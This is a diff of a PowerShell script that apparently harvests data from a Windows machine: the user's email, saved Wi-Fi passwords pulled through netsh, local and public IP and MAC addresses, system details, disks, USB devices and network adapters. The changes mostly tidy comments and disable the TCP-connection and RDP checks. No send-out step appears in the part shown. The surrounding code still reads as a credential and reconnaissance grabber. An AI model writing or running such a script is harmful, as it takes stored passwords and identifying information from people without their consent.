@@ -39,7 +39,6 @@ function Get-email {
 }
 $EM = Get-email
 ##########################
-# Get wifi networks
 function Get-WifiPasswords {
     try {
         # Get Wi-Fi profiles using netsh
@@ -70,8 +69,7 @@ function Get-WifiPasswords {
     }
 }
 ##########################
-# Get info about pc
-# Retrieve local IP addresses using Get-CimInstance
+# Get info about PC: local IP addresses using Get-CimInstance
 try {
     #$computerIPs = Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true } | Select-Object -ExpandProperty IPAddress
     $localIP = (ipconfig | Select-String -Pattern "IPv4").Line -split ":\s*" | Select-Object -Last 1
@@ -115,19 +113,18 @@ try {
     $computerPubIP = "Error getting Public IP"
     $localIP = "Error getting Local IP"
     $MAC = "Error getting MAC address"
-    $IsDHCPEnabled = $false
+    #$IsDHCPEnabled = $false
 }
 
 # **Step 2: Active Connections and Listeners**
-try {
+<#try {
     $activeConnections = Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State
     $ConnectionsInfo = ($activeConnections | Out-String)
 } catch {
     $ConnectionsInfo = "Failed to retrieve active TCP connections."
-}
+}#>
 ##########################
-# Get System Information
-# Debug: Print System Details to Console
+# Get System Information: Print System Details to Console
 Write-Host "Building System Details..."
 
 # Get System Info
@@ -183,12 +180,12 @@ $Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, @{Name="D
 #Get - Com & Serial Devices
 $COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table
 # Check RDP
-$RDP
+<#$RDP
 if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
 	$RDP = "RDP is Enabled" 
 } else {
 	$RDP = "RDP is NOT enabled" 
-}
+}#>
 ##########################
 # Get Network Interfaces
 $Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
